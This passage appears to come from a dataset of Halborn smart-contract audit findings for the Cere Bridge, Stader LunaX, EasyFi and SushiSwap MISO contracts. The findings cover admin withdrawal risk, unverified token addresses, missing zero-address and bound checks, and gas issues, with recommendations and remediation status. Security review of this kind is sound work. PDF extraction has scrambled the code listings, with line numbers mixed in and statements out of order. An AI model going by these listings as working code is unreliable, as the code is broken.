the handlers. Code location: Listing 1: Bridge.sol (Line 283) address handlerAddress , address tokenAddress , address recipient , uint256 amountOrTokenID 276 function adminWithdraw ( 277 278 279 280 281 ) external onlyAdmin { 282 283 284 } IERCHandler handler = IERCHandler ( handlerAddress ); handler . withdraw ( tokenAddress , recipient , amountOrTokenID ); Risk Level: Likelihood - 1 Impact - 3 Recommendation: The adminWithdraw function allows the owner of the system to withdraw all the assets from the different handlers. The owner should be limited to the minimum operations possible. These functionalities should be split between multiple role based users with multi-signature wallets for each one. If possible, it is recommended to remove this function. If not, it is recommended to at least use a multisig wallet as the Admin wallet 16 adding also a Timelock. Remediation Plan: RISK ACCEPTED: The Cerebellum Network team accepts this risk as they use a multi-signature wallet to manage the admin wallet. 17 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Low"]}, {"title": "ERC20SAFE.SAFECALL DOES NOT VERIFY THAT THE TOKEN ADDRESS IS A CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the contract ERC20Safe the function _safeCall() is used to perform all the token transfers: Listing 2: ERC20Safe.sol function _safeCall ( IERC20 token , bytes memory data ) private { ( bool success , bytes memory returndata ) = address ( token ). require ( success , \" ERC20 : call failed \" ); if ( returndata . length > 0) { 76 77  call ( data ); 78 79 80 81 82  operation did not succeed \" ); 83 84 } } require ( abi . decode ( returndata , ( bool )) , \" ERC20 : This function does not verify that the token address passed as a parameter is actually a contract allowing, as can be seen below, to perform a transfer using the zero address as the token parameter: This was recently exploited in the Qubit Finances bridge. The likelihood of this exploit is very low as the token used in the deposits must pass this check: 18 require(_contractWhitelist[tokenAddress], \"provided tokenAddress is not whitelisted\"); This scenario would only become real if an admin called Bridge. adminSetResource with an invalid/wrong tokenAddress. Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to follow OpenZeppelins approach and check in the _safeCall() function that the token address is a contract address. To achieve that, the function functionCall() instead of call() from OpenZeppelins Address.sol contract can be used. Also another possible addition would be checking the balance before and after the asset transfer to ensure that the number of the transferred asset compiles the expectation. Remediation Plan: RISK ACCEPTED: The Cerebellum Network team accepts the risk of this finding. 19 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "Multiple contracts are missing address validation in their constructors. Every address should be validated and checked that is different from zero. Code location: ERC20Handler.sol - Line 38: address bridgeAddress - Line 40: address[] memory initialContractAddresses ERC721Handler.sol - Line 49: address bridgeAddress - Line 51: address[] memory initialContractAddresses - Line 52: address[] memory burnableContractAddresses GenericHandler.sol - Line 66: address bridgeAddress - Line 68: address[] memory initialContractAddresses Bridge.sol - Line 110: address[] memory initialRelayers - Line 141: grantRole(DEFAULT_ADMIN_ROLE, newAdmin); - Line 180: grantRole(RELAYER_ROLE, relayerAddress); - Line 207: _resourceIDToHandlerAddress[resourceID] = handlerAddress; - Line 227: _resourceIDToHandlerAddress[resourceID] = handlerAddress; Risk Level: Likelihood - 3 Impact - 2 20 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: RISK ACCEPTED: The Cerebellum Network team accepts the risk of this finding. 21 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Low"]}, {"title": "WRONG INFORMATION DISPLAYED IN THE DEPOSIT RECORD WHEN SUPPLYING TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the contract ERC20Handler.sol, the deposit function assumes that the total amount of tokens that will be locked in the smart contract after calling lockERC20(tokenAddress, depositer, address(this), amount) ; is equal to the amount parameter (and thus it creates a depositRecord accordingly). Listing 3: ERC20Handler.sol - deposit (Lines 111,120) bytes32 resourceID , uint8 uint64 address depositer , bytes calldata data destinationChainID , depositNonce , ) external override onlyBridge { memory recipientAddress ; amount ; lenRecipientAddress ; function deposit ( bytes uint256 uint256 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99  lenRecipientAddress )) ) assembly { amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , 100 101 calldatacopy ( 22 102 recipientAddress , // copy to  destinationRecipientAddress 103 104 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size (  calldatasize - 0 x104 ) 105 106 107 108 ) } address tokenAddress = _resourceIDToTokenContractAddress [  resourceID ]; 109 require ( _contractWhitelist [ tokenAddress ], \" provided  tokenAddress is not whitelisted \" ); 110 111 112 113 lockERC20 ( tokenAddress , depositer , address ( this ) , amount ); _depositRecords [ destinationChainID ][ depositNonce ] =  DepositRecord ( 114 115 116 117 118 119 120 121 122 ); } tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , depositer , amount However, this may not be true if the tokenAddress is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in depositRecord. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to get the actual received amount by calculating the difference of token balance before and after the transfers. 23 Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team claims that Bridge uses only the CERE token. The CERE token is not a transfer-on-fee or a deflationary token. 24 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Informational"]}, {"title": "USE OF TRANSFER INSTEAD OF CALL TO TRANSFER ETHER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the contract Bridge, the transferFunds function uses address.transfer Any smart contract that () to transfer Ether to a set of addresses. uses transfer() or send() is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300. Since its introduction, transfer() has typically been recommended by the security community because it helps guard against reentrancy attacks. This guidance made sense under the assumption that gas costs wouldnt change, but that assumption turned out to be incorrect. As gas costs are subject to change, then smart contracts cant depend on any particular gas costs, thats why transfer() and send() should be avoided. call() should be used instead. Code Location: Listing 4: Bridge.sol (Line 429) 427 function transferFunds ( address payable [] calldata addrs , uint  [] calldata amounts ) external onlyAdmin { 428 429 430 431 for ( uint i = 0; i < addrs . length ; i ++) { addrs [ i ]. transfer ( amounts [i ]) ; } } Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: It is recommended to use call() instead of transfer() to transfer Ether. Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 26 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Informational"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: ERC20Handler.sol - Line 47: for (uint256 i = 0; i < initialResourceIDs.length; i++){ ERC721Handler.sol - Line 59: for (uint256 i = 0; i < initialResourceIDs.length; i++){ - Line 63: for (uint256 i = 0; i < burnableContractAddresses.length; i++){ GenericHandler.sol - Line 83: for (uint256 i = 0; i < initialResourceIDs.length; i++){ Bridge.sol - Line 120: for (uint i; i < initialRelayers.length; i++){ - Line 122: _totalRelayers++; - Line 428: for (uint i = 0; i < addrs.length; i++){ Proof of Concept: For example, based in the following test contract: Listing 5: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 27 function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } 4 contract test { 5 6 7 8 9 10 11 12 13 } } We can see the difference in the gas costs: Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This does not only apply to the iterator variable. It also applies to variables declared inside the loop code block. 28 Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 29 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Informational"]}, {"title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "As i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: ERC20Handler.sol - Line 47: for (uint256 i = 0; i < initialResourceIDs.length; i++){ ERC721Handler.sol - Line 59: for (uint256 i = 0; i < initialResourceIDs.length; i++){ - Line 63: for (uint256 i = 0; i < burnableContractAddresses.length; i++){ GenericHandler.sol - Line 83: for (uint256 i = 0; i < initialResourceIDs.length; i++){ Bridge.sol - Line 428: for (uint i = 0; i < addrs.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize uint256 variables to 0 to save some gas. For example, use instead: for (uint256 i; i < initialResourceIDs.length; ++i){. 30 Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 31 ", "labels": ["Halborn", "Cere_Bridge", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Cere_Bridge_Smart_Contract_Security_Audit_Solidity_Report_Halborn_Final.pdf", "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: ERC721MinterBurnerPauser.sol - mint() (ERC721MinterBurnerPauser.sol#44-49) - pause() (ERC721MinterBurnerPauser.sol#60-63) - unpause() (ERC721MinterBurnerPauser.sol#74-77) ERC721Safe.sol - fundERC721() (ERC721Safe.sol#21-24) ERC20Safe.sol - fundERC20() (ERC20Safe.sol#20-23) Bridge.sol - cancelProposal() (Bridge.sol#380-390) Whitelist.sol - enableWhitelist() (Whitelist.sol#69-73) - disableWhitelist() (Whitelist.sol#80-84) - removeFromWhitelist() (Whitelist.sol#112-116) - addToWhitelist() (Whitelist.sol#100-104) Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. Remediation Plan: ACKNOWLEDGED: The Cerebellum Network team acknowledged this finding. 33 3.10 (HAL-10) UNUSED IMPORTS - INFORMATIONAL ", "labels": ["Halborn", "Cere_Bridge", "Severity: Informational"]}, {"title": "MANAGER ADDRESS CANNOT BE TRANSFERRED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The functions to update the configuration in the contracts within scope lacked the option of setting a new manager as a privileged address. If the keys of the manager account were suspected to be compromised, or the development team needed to change the address for an operational reason, a sizable portion of the contracts functionality will be rendered unusable. Code Location: Listing 1: Affected functions 1 contracts / airdrops - registry / src / contract . rs :59: pub fn update_airdrop_registry ( 2 contracts / reward / src / contract . rs :204: pub fn update_config ( 3 contracts / staking / src / contract . rs :143: pub fn update_config ( Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to add manager transfer capabilities to the contracts, split into two different functions: set_manager and accept_manager. The latter function allows the transfer to be completed by the recipient, pro- tecting the contract against potential typing errors compared to single- step manager change features. 14 Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit 849a43b9c96cb6b70b67a0bb60aaa5c0be221d1e. 15 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Medium"]}, {"title": "UNDERUSED PROTOCOL INACTIVE STATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The staking contract implemented a switch to go into a pause-like state called Protocol Inactive by using the config.active setting. This check was not implemented consistently across all the functions accessible for unprivileged users, but only on the deposit one. This state could be desirable for some reasons, where external users interference would like to be kept to the minimum among all features of the contract. Code Location: Listing 2: Affected assets 1 contracts / staking / src / contract . rs :486 redeem_rewards function 2 contracts / staking / src / contract . rs :523 swap_rewards function 3 contracts / staking / src / contract . rs :486 reinvest function 4 contracts / staking / src / contract . rs :615 reimburse_slashing function 5 contracts / staking / src / contract . rs :715 undelegate_stake function 6 contracts / staking / src / contract . rs :810 reconcile_funds function 7 contracts / staking / src / contract . rs :888 withdraw_funds_to_wallet function 8 contracts / staking / src / contract . rs :976 claim_airdrops function Risk Level: Likelihood - 1 Impact - 3 16 Recommendation: It is recommended to extend the usage of the Protocol Inactive check to the rest of publicly accessible functionalities related to fund updates, stake tracking or swap contract interaction. Remediation plan: SOLVED: A new operations control mechanism has been implemented to have a more granular control over paused operations, covering all listed functionalities. This issue was fixed in commit 368f9a665af2fd6d512d2687e40f8699b7a6e164. 17 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Low"]}, {"title": "CONFIGURATION PARAMETER COULD NOT BE UPDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The instantiate function did not set the cw20_token_contract address, as done with other contract addresses required in the configuration. Instead, it relied on update_config being called post initialization, which could cause undesirable situations if this address is not set right after deployment. It is worth noting that the update_config function only allowed to set the CW20 address if it contained the initial value Addr::unchecked(\"0\"). This effectively forbade any future change after the first update. Code Location: Listing 3: contracts/staking/src/contract.rs (Lines 62) . api . addr_validate ( msg . airdrops_registry_contract . as_str () )? , 55 airdrop_registry_contract : deps 56 57 58 airdrop_withdrawal_contract : deps 59 60 61 reward_contract : deps . api . addr_validate ( msg . reward_contract . as_str . api . addr_validate ( msg . airdrop_withdrawal_contract . as_str () )? , () )?, 62 cw20_token_contract : Addr :: unchecked ( \"0 \" ) , 63 64 protocol_fee_contract : deps . api . addr_validate ( msg . protocol_fee_contract . as_str () )? , Listing 4: contracts/staking/src/contract.rs (Lines 153) 143 pub fn update_config ( 144 145 deps : DepsMut , info : MessageInfo , 18 env : Env , update_config : ConfigUpdateRequest , 146 147 148 ) -> Result < Response , ContractError > { 149 150 151 152 let mut config = CONFIG . load ( deps . storage ) ?; validate (& config , & info , & env , vec! [ Verify :: SenderManager ]) ?; if let Some ( cw20_contract ) = update_config . cw20_token_contract 153 154 155 156 { if config . cw20_token_contract == Addr :: unchecked ( \"0 \" ) { config . cw20_token_contract = deps . api . addr_validate ( cw20_contract . as_str () ) ?; } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: The cw20_token_contract variable should be set upon instantiate, as with the other contract addresses. Remediation plan: ACKNOWLEDGED: Stader Labs acknowledged this finding. 19 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Informational"]}, {"title": "OUTDATED INFORMATION DISPLAYED TO USERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The reimburse_slashing function of the staking contract does not update the total_staked and exchange_rate state variables. As detailed in the comment of line 635, most functionalities perform a check_slashing at the beginning or update these values. However, this is not the case of query_user_info and query_compute_deposit_breakdown. If a user queries those functions after a reimburse_slashing has been performed, they would receive erroneous information due to the lack of update. Code Location: Listing 5: Affected assets 1 contracts / staking / src / contract . rs :615 reimburse_slashing function Risk Level: Likelihood - 2 Impact - 1 Recommendation: Update the total_staked and exchange_rate state variables consistently so every function returns or work with up-to-date information. 20 Remediation plan: SOLVED: Added a RedeemRewards message from the staking contract as a result of the reimburse_slashing function, which effectively updates the exchange rate at the end of the transaction. This issue was fixed on commit 24ec25b51e52e98c1128cd77c379d94b3e9dab58s. 21 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Informational"]}, {"title": "MISUSE OF HELPER METHODS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of the unwrap and expect function is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option does not have Some value or Result. Never- theless, leaving unwrap or expect functions in production environments is a bad practice because not only will this cause the program to crash out, or panic!, but also (in case of unwrap) no helpful messages are shown to help the user solve, or understand the reason of the error. Code Location: Listing 6: Affected assets 1 contracts / reward / src / contract . rs : # L93 , 168 , 171 , 217 2 contracts / staking / src / contract . rs : # L266 , 361 , 371 , 400 , 433 , 579 , 632 , 696 , 701 , 743 , 773 , 785 , 830 , 836 , 867 , 880 , 946 , 956 , 1020 , 1108 , 1121 , 1137 3 contracts / staking / src / helpers . rs : # L90 , 98 , 122 , 163 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not use the unwrap or expect functions in a production environment because this use provokes panic! and may crash the Spectrum contracts without error messages. Some alternatives are possible, such as propagating the error by putting a \"?\", using unwrap_or / unwrap_or_else / unwrap_or_default functions, or using error-chain crate for errors. 22 Reference: https://crates.io/crates/error-chain Remediation plan: SOLVED: Most of the instances highlighted below has been fixed using the recommendations or deemed secure due to previous checks. Instances related to the result of checked_add operations have not been modified, as the risk of overflow in those cases is minimal, since the entire supply of Terra supply will not cause the value of uint128 to overflow. This issue was fixed in commit 7478e89ee9a0f72b89690573fd2dee956d2408fa. 23 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Informational"]}, {"title": "MULTIPLE INSTANCES OF UNCHECKED MATH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some mathematical operations that could cause unexpected behavior under specific circumstances were found on the codebase. Although no effective arithmetic over/underflow were found and the overflow-checks = true flag was set on Cargo.toml, it is still recommended to avoid unchecked math as much as possible to follow best-practices and limit the risk of future updates introducing an actual vulnerability. Code Location: Listing 7: Affected assets 1 packages / stader - utils / src / coin_utils . rs :173: Decimal = ( b_u256 * a_u256 ). into () ; 2 packages / stader - utils / src / coin_utils . rs :181: Decimal = ( b_u256 + a_u256 ). into () ; 3 packages / stader - utils / src / coin_utils . rs :189: Decimal = ( a_u256 - b_u256 ). into () ; 4 packages / stader - utils / src / coin_utils . rs :243: let c_u256 : let c_u256 : let c_u256 : Uint128 :: new ( coin . amount . u128 () + existing_coin . u128 () ) , 5 packages / stader - utils / src / coin_utils . rs :278: Uint128 :: new ( existing_coin . u128 () - coin . amount . u128 () ) , 6 packages / stader - utils / src / coin_utils . rs :432: coin . amount . u128 () * ratio . numerator () / ratio . denominator () , 7 packages / stader - utils / src / coin_utils . rs :437: numerator () / dec . denominator () ) as u128 ( num * dec . Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: In the release mode, Rust does not panic on overflows and overflown values just wrap without any explicit feedback to the user. It is rec- ommended then to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Consider replacing the addition operator with Rusts checked_add method, the multiplication with checked_mul and so on. Remediation plan: ACKNOWLEDGED: Since the affected instances were not exploitable and there- fore did not pose a direct risk to in-scope contracts, Stader Labs ac- knowledged the potential risks outlined above. 25 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Informational"]}, {"title": "UNFINISHED DEVELOPMENT COMMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_LunaX_Contrracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple ToDo comments and commented code instances were found on the codebase. Although incomplete code does not directly cause a security vulnerability or affect the audits outcome as far as it is functional, having development comments could simplify the process for an attacker to find a valid attack surface within the contract. In addition, it shows that the audited code will be different from the released one, which could cause that new vulnerabilities were to be introduced in the code after the audit. Code Location: Listing 8: Affected assets 1 staking / src / helpers . rs :29:// TODO : bchain99 - write unit - tests to validate . 2 staking / src / contract . rs :1092:// TODO - GM . Test this 3 staking / src / contract . rs :1101: // TODO - GM . Will converting u64 to string for batch id start work ? 4 staking / src / contract . rs :521:// TODO - GM . Does swap have a fixed cost or a linear cost ? 5 reward / src / contract . rs :77:// TODO - GM . Does swap have a fixed cost or a linear cost ? Useful to make this permissionless . 6 reward / src / contract . rs :94: // let denoms : Vec < String > = total_rewards 7 reward / src / contract . rs :95: 8 reward / src / contract . rs :96: () ) 9 reward / src / contract . rs :97: 10 // // // . iter () . map (| item | item . denom . clone . collect () ; 26 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Remove all the instances development related comments, reviewing if some modifications are still pending to be made. Remediation plan: SOLVED: Suggested mitigation steps have been implemented by the Stader Labs team in commit 07878e2eefa1e66a9a25ad3dc234340a355b5ad0. 27 ", "labels": ["Halborn", "Stader_Labs_LunaX_Contrracts_CosmWasm", "Severity: Informational"]}, {"title": "PRAGMA VERSION DEPRECATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The current version in use for the contract is pragma ^0.5.16. While this version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing 1: stakingFactory.sol (Lines 1) 1 pragma solidity ^0.5.16; 2 3 /* * Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.6. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code. (0.6.12) Remediation Plan: SOLVED: Pragma version was upgraded to 0.7.6. 13 ", "labels": ["Halborn", "EasyFi_Staking", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Smart contract stakingFactory.sol uses the floating pragma ^0.5.16. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively security recently or vulnerabilities. versions released unknown pragma have may Code Location: Listing 2: stakingFactory.sol (Lines 1) 1 pragma solidity ^0.5.16; 2 3 /* * Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version. It is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (^) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: Pragma version was locked to 0.7.6. 14 ", "labels": ["Halborn", "EasyFi_Staking", "Severity: Low"]}, {"title": "MISSING BOUND CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In notifyRewardAmount() function, rewardRate is calculated dividing reward by RewardDuration. In addition, reward.add(leftover) is divided by rewardsDuration to calculate rewardRate as well. If both denominators are greater than the numerators, rewardRate leads to 0. Code Location: Listing 3: stakingFactory.sol (Lines 1) 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 639 640 function notifyRewardAmount ( uint256 reward ) external onlyRewardsDistribution updateReward ( address (0) ) { if ( block . timestamp >= periodFinish ) { rewardRate = reward . div ( rewardsDuration ); } else { uint256 remaining = periodFinish . sub ( block . timestamp ); uint256 leftover = remaining . mul ( rewardRate ); rewardRate = reward . add ( leftover ). div ( rewardsDuration ) ; } // Ensure the provided reward amount is not more than the balance in the contract . // This keeps the reward rate in the right range , preventing overflows due to 15 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 // very high values of rewardRate in the earned and rewardsPerToken functions ; // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow . uint balance = rewardsToken . balanceOf ( address ( this )) ; require ( rewardRate <= balance . div ( rewardsDuration ) , \" Provided reward too high \"); lastUpdateTime = block . timestamp ; periodFinish = block . timestamp . add ( rewardsDuration ); emit RewardAdded ( reward ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: Consider adding modifiers for bound checks such as: Listing 4 1 require ( reward >= rewardsDuration , \" Reward is too small \") ; Listing 5 1 require ( reward . add ( leftover ) >= rewardsDuration , \" Reward is too small \") ; 16 Remediation Plan: RISK ACCEPTED: rewardsDuration is based on UNIX timestamp and reward is in wei(token with decimals 6,8,18 includes). Rewards will never be less than 1000 Tokens. With least case (Reward token with 6 decimals and duration for one year) 1,000,000,000 will be greater than 31,556,952(for 1 year). 17 ", "labels": ["Halborn", "EasyFi_Staking", "Severity: Informational"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. If the reward is higher than uint(-1).div(1e18) could happen an overflow. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 6: stakingFactory.sol (Lines 1) 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 function notifyRewardAmount ( uint256 reward ) external onlyRewardsDistribution updateReward ( address (0) ) { if ( block . timestamp >= periodFinish ) { rewardRate = reward . div ( rewardsDuration ); } else { uint256 remaining = periodFinish . sub ( block . timestamp ); uint256 leftover = remaining . mul ( rewardRate ); rewardRate = reward . add ( leftover ). div ( rewardsDuration ) ; } // Ensure the provided reward amount is not more than the balance in the contract . 18 639 640 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 // This keeps the reward rate in the right range , preventing overflows due to // very high values of rewardRate in the earned and rewardsPerToken functions ; // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow . uint balance = rewardsToken . balanceOf ( address ( this )) ; require ( rewardRate <= balance . div ( rewardsDuration ) , \" Provided reward too high \"); lastUpdateTime = block . timestamp ; periodFinish = block . timestamp . add ( rewardsDuration ); emit RewardAdded ( reward ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: Although SafeMath library is used, consider adding the following modifier as well to prevent the overflow: Listing 7 1 require ( reward < uint ( -1) . div (1 e18 ) , \" Reward overflow \") ; 19 Remediation Plan: RISK ACCEPTED: rewardAmount is set in Factory contract at deployment. Then, it can never be greater than uint ( -1) . div (1 e18 ). 20 ", "labels": ["Halborn", "EasyFi_Staking", "Severity: Informational"]}, {"title": "NO TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Unlike traditional software, smart contracts can not be modified unless deployed using a proxy contract. Because of the permanence, unit tests and functional testing are recommended to ensure the code works correctly before deployment. Mocha and Chai are valuable tools to perform unit tests in smart contracts. Mocha is a Javascript testing framework for creating synchronous and asynchronous unit tests, and Chai is a library with assertion functionality such as assert or expect and should be used to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 1 Impact - 2 Recommendation: We recommend performing as many test cases as possible to cover all conceivable scenarios in the smart contract. Remediation Plan: SOLVED: EasyFi Team added test coverage. 21 ", "labels": ["Halborn", "EasyFi_Staking", "Severity: Informational"]}, {"title": "DOCUMENTATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Staking_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "For The documentation provided by the EasyFi team is not complete. instance, the documentation included in the GitHub repository should include a walkthrough to deploy and test the smart contracts. Recommendation: Consider updating the documentation in Github for greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: SOLVED: EasyFi Team documented all deployment stage. 22 ", "labels": ["Halborn", "EasyFi_Staking", "Severity: Informational"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/SushiSwap_MISO_Smart_Contract_Report_Halborn_v2.pdf", "body": "During a manual static review, the tester noticed the use of block. The contract developers should be aware timestamp in few contracts. Miners can influence the value that this does not mean current time. of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 1: PoolLiquidity.sol (Lines 141) 139 140 141 142 143 144 145 146 // / @notice Deposits ETH to the contract . function depositETH () public payable { require ( block . timestamp < deadline , \" PoolLiquidity : Contract has expired \" ); require ( liquidityAdded == 0 , \" PoolLiquidity : Liquidity already added \"); if ( msg . value > 0 ) { WETH . deposit { value : msg . value }() ; } } Listing 2: PoolLiquidity.sol (Lines 153) 152 153 154 155 156 function depositTokens ( uint256 amount ) external returns ( bool success ) { require ( block . timestamp < deadline , \" PoolLiquidity : Contract has expired \" ); require ( amount > 0, \" PoolLiquidity : Token amount 